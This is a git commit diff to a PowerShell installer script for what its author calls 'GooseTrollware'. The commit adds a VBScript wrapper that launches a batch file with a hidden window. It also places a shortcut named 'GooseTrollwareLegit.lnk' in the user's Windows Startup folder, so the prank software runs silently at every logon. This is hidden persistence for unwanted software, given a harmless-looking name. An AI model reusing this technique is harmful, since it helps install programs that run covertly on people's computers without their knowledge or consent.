d7d9f1b4f597103c62fbfb01628a53b9a3898184
smcbride-ca <smcbride07@hotmail.com>
2023-11-20 21:45:45 -0600

    It did not work. I swear it's fixed now

--- i.ps1
+++ i.ps1
@@ -16,12 +16,27 @@ echo PowerShell script run command sent.
 "@
 $batchContent | Out-File -FilePath $gloc -Encoding ASCII
 
-# Create shortcut to bat script
-# Make sure cmd is hidden
+# # Create shortcut to bat script
+# # Make sure cmd is hidden
+# $WshShell = New-Object -comObject WScript.Shell
+# $Shortcut = $WshShell.CreateShortcut("$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseTrollwareLegit.lnk")
+# $Shortcut.TargetPath = "$home\GooseTrollware\GooseTrollwareLegit.bat"
+# $Shortcut.WindowStyle = 7
+# $Shortcut.Save()
+
+# VBScript HELL
+$gloc3="GooseTrollware\GooseTrollwareLegit.vbs"
+$batchContent = @"
+CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+"@
+$batchContent | Out-File -FilePath $gloc3 -Encoding ASCII
+
+# Create shortcut to VBScript file
+# why the hell do I have to use a vbs file to launch a bat file to launch a powershell file
 $WshShell = New-Object -comObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseTrollwareLegit.lnk")
-$Shortcut.TargetPath = "$home\GooseTrollware\GooseTrollwareLegit.bat"
-$Shortcut.WindowStyle = 7
+$Shortcut.TargetPath = "$home\GooseTrollware\GooseTrollwareLegit.vbs"
+$Shortcut.Arguments = "$home\GooseTrollware\GooseTrollwareLegit.bat"
 $Shortcut.Save()
 
 # Copy powershell script to goose trollware folder (should be moved inside the zip?)
